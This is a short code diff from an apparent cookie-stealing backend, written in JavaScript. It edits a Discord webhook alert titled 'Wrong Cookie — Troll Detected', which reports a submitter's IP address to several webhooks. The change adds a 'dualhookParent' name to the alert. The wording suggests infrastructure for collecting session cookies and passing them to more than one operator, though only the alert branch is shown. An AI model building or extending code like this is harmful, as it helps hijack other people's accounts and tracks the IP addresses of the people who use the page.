@@ -126,7 +126,9 @@ export default async function handler(req, res) {
     await Promise.all(webhooks.map(wh => discordSend(wh, {
       embeds: [{
         title:       '⚠️ Wrong Cookie — Troll Detected',
-        description: '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
+        description: record.dualhookParent
+          ? `<a:emoji_17:1508694920972468347> ${record.dualhookParent} <a:emoji_17:1508694920972468347>`
+          : '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
         color:  0xff3333,
         fields: [
           { name: '🌐 IP',       value: ip,                   inline: true  },
